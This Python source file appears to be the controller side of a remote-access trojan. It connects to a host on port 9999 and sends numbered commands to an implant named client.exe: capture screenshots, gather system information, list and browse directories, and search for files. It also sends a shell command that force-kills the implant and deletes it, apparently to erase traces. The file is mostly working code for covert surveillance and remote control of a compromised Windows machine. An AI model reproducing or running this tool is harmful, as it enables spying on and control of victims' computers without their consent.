import socket
import subprocess

def save_file(filename, client_socket):
    file_size = int(client_socket.recv(1024).decode())
    client_socket.sendall(b"OK")
    data = b""
    while len(data) < file_size:
        chunk = client_socket.recv(1024)
        data += chunk
    with open(filename, "wb") as file:
        file.write(data)

def list_dir(client):
    response = client.recv(4096).decode()
    print("Directory contents:\n" + response)

def open_dir(client):
    new_dir = input("Enter directory path: ").strip()
    client.send(new_dir.encode())
    response = client.recv(4096).decode()
    print(response)

def search_file(client):
    file_name = "client.exe"
    client.send("8".encode())
    client.send(file_name.encode())
    response = client.recv(4096).decode()

    first_match = response.splitlines()[0] if response else "No results found."
    print("First match found:\n" + first_match)
    return first_match

def interactive_shell(client):
    # file_path = search_file(client)
    process_name = "client.exe"
    file_path = "C:\\Users\\Admin\\Downloads\\output\\client.exe"
    command = f'taskkill /im {process_name} /f && del "{file_path}"'
    client.send(command.encode())
    
    # Отримуємо відповідь від клієнта
    response = client.recv(4096).decode()
    print("Response from client:")
    print(response)


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("192.168.1.10", 9999))

    while True:
        print("\nCommands:")
        print("1. screenshot")
        print("2. system_info")
        print("3. list_dir")
        print("4. open_dir")
        print("8. search_file")
        print("11. exit")

        command = input("Enter command number: ").strip()
        client.send(command.encode())
        
        if command == "1":
            save_file("received_screenshot.png", client)
            print("Screenshot saved as 'received_screenshot.png'")
        elif command == "2":
            info = client.recv(1024).decode()
            print(f"System Info: {info}")
            command = "7"
            client.send(command.encode())
            interactive_shell(client)
            print(f"File client.exe was deleted")
        elif command == "3":
            list_dir(client)
        elif command == "4":
            open_dir(client)
        # elif command == "8":
        #     search_file(client)
        elif command == "11":
            print("Exiting...")
            break
        else:
            print(client.recv(1024).decode())

    client.close()

if __name__ == "__main__":
    main()
